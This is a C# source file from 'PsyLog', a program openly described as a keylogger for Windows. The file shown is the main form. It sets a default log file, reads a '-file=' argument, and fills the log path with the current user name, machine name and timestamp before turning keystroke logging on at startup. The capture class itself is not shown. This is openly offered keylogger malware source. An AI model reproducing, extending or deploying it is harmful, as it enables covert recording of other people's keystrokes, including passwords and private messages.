//-----------------------------------------------------------------------
// PsyLog
// A simple keylogger for Windows.
// Copyright (C) 2020 Gavin Kendall
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.
//-----------------------------------------------------------------------
using System;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace psylog
{
    public partial class frmPsyLog : Form
    {
        private readonly Keylogger keylogger = new Keylogger();
        private const string REGEX_COMMAND_LINE_LOG = "^-file=(?<File>.+)$";

        /// <summary>
        /// The format for years.
        /// </summary>
        public static readonly string YearFormat = "yyyy";

        /// <summary>
        /// The format for months.
        /// </summary>
        public static readonly string MonthFormat = "MM";

        /// <summary>
        /// The format for days.
        /// </summary>
        public static readonly string DayFormat = "dd";

        /// <summary>
        /// The format for hours.
        /// </summary>
        public static readonly string HourFormat = "HH";

        /// <summary>
        /// The format for minutes.
        /// </summary>
        public static readonly string MinuteFormat = "mm";

        /// <summary>
        /// The format for seconds.
        /// </summary>
        public static readonly string SecondFormat = "ss";

        /// <summary>
        /// The format for milliseconds.
        /// </summary>
        public static readonly string MillisecondFormat = "fff";

        /// <summary>
        /// Returns a string representation of a date in the format yyyy-MM-dd
        /// </summary>
        public static string DateFormat
        {
            get
            {
                StringBuilder sb = new StringBuilder();

                sb.Append(YearFormat);
                sb.Append("-");
                sb.Append(MonthFormat);
                sb.Append("-");
                sb.Append(DayFormat);

                return sb.ToString();
            }
        }

        /// <summary>
        /// Returns a string representation of a time in the format HH-mm-ss-fff that's safe for filenames in Windows.
        /// </summary>
        public static string TimeFormatForWindows
        {
            get
            {
                StringBuilder sb = new StringBuilder();

                sb.Append(HourFormat);
                sb.Append("-");
                sb.Append(MinuteFormat);
                sb.Append("-");
                sb.Append(SecondFormat);
                sb.Append("-");
                sb.Append(MillisecondFormat);

                return sb.ToString();
            }
        }

        public frmPsyLog(string[] args)
        {
            InitializeComponent();
            
            ParseCommandLine(args);
        }

        private void ParseCommandLine(string[] args)
        {
            keylogger.File = "psylog.txt";

            foreach (string arg in args)
            {
                if (Regex.IsMatch(arg, REGEX_COMMAND_LINE_LOG))
                {
                    string file = Regex.Match(arg, REGEX_COMMAND_LINE_LOG).Groups["File"].Value;

                    keylogger.File = ParseMacroTags(file);
                }
            }

            keylogger.Enabled = true;
        }

        private string ParseMacroTags(string macro)
        {
            DateTime dtNow = DateTime.Now;

            macro = macro.Replace("%user%", Environment.UserName);
            macro = macro.Replace("%machine%", Environment.MachineName);

            macro = macro.Replace("%date%", dtNow.ToString(DateFormat));
            macro = macro.Replace("%time%", dtNow.ToString(TimeFormatForWindows));

            macro = macro.Replace("%year%", dtNow.ToString(YearFormat));
            macro = macro.Replace("%month%", dtNow.ToString(MonthFormat));
            macro = macro.Replace("%day%", dtNow.ToString(DayFormat));
            macro = macro.Replace("%hour%", dtNow.ToString(HourFormat));
            macro = macro.Replace("%minute%", dtNow.ToString(MinuteFormat));
            macro = macro.Replace("%second%", dtNow.ToString(SecondFormat));
            macro = macro.Replace("%millisecond%", dtNow.ToString(MillisecondFormat));

            return macro;
        }
    }
}